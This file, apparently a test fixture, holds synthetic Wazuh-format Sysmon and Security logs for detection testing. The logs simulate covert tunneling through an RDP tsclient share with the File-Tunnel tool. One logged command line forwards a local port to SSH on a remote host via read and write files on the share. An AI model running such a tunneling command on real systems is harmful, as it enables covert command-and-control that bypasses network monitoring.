@@ -1,0 +1,224 @@
+{
+  "_metadata": {
+    "attack_id": "T1090.001",
+    "variation": "002",
+    "name": "File-Tunnel via RDP Share (tsclient)",
+    "description": "File-Tunnel using RDP mapped drive for covert tunneling",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "command_and_control",
+    "format": "wazuh-native",
+    "format_version": "1.0",
+    "tool": "File-Tunnel",
+    "tool_url": "https://github.com/fiddyschmitt/File-Tunnel",
+    "mitre_techniques": [
+      "T1090.001",
+      "T1021.001",
+      "T1572"
+    ]
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - File-Tunnel using tsclient RDP share",
+      "sequence": 1,
+      "timestamp": "2026-01-31T15:30:00.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: File-Tunnel using RDP tsclient share",
+          "id": "100310",
+          "mitre": {
+            "id": [
+              "T1090.001",
+              "T1021.001"
+            ],
+            "tactic": [
+              "Command and Control",
+              "Lateral Movement"
+            ],
+            "technique": [
+              "Proxy",
+              "Remote Desktop Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "rdp",
+            "tunnel"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000005.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-31 15:30:00.000",
+              "processGuid": "{C3D4E5F6-3456-789A-BCDE-F01234567890}",
+              "processId": "7890",
+              "image": "C:\\Users\\attacker\\ft.exe",
+              "commandLine": "ft.exe -L 8888:198.51.100.50:22 --write \"\\\\tsclient\\c\\temp\\in.dat\" --read \"\\\\tsclient\\c\\temp\\out.dat\"",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=1a2b3c4d5e6f7890abcdef1234567890abcdef1234567890abcdef12345678",
+              "parentProcessGuid": "{C3D4E5F6-1111-2222-3333-444455556666}",
+              "parentProcessId": "3456",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 11 - Tunnel file on tsclient share",
+      "sequence": 2,
+      "timestamp": "2026-01-31T15:30:01.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 11: Suspicious file created on RDP tsclient share",
+          "id": "100311",
+          "mitre": {
+            "id": [
+              "T1090.001",
+              "T1021.001"
+            ],
+            "tactic": [
+              "Command and Control",
+              "Lateral Movement"
+            ],
+            "technique": [
+              "Proxy",
+              "Remote Desktop Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows",
+            "rdp",
+            "exfiltration"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000005.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-31 15:30:01.000",
+              "processGuid": "{C3D4E5F6-3456-789A-BCDE-F01234567890}",
+              "processId": "7890",
+              "image": "C:\\Users\\attacker\\ft.exe",
+              "targetFilename": "\\\\tsclient\\c\\temp\\in.dat",
+              "creationUtcTime": "2026-01-31 15:30:01.000"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Security Event 5140 - Network share access to tsclient",
+      "sequence": 3,
+      "timestamp": "2026-01-31T15:30:02.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Windows Security - Network share access to RDP mapped drive",
+          "id": "100312",
+          "mitre": {
+            "id": [
+              "T1021.001"
+            ],
+            "tactic": [
+              "Lateral Movement"
+            ],
+            "technique": [
+              "Remote Desktop Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "windows",
+            "security",
+            "network_share"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000005.000003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "5140",
+              "channel": "Security",
+              "providerName": "Microsoft-Windows-Security-Auditing",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "subjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+              "subjectUserName": "attacker",
+              "subjectDomainName": "CORP",
+              "subjectLogonId": "0x12345678",
+              "objectType": "File",
+              "shareName": "\\\\*\\tsclient",
+              "sharePath": "\\\\tsclient\\c",
+              "accessMask": "0x1",
+              "accessList": "%%4416"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
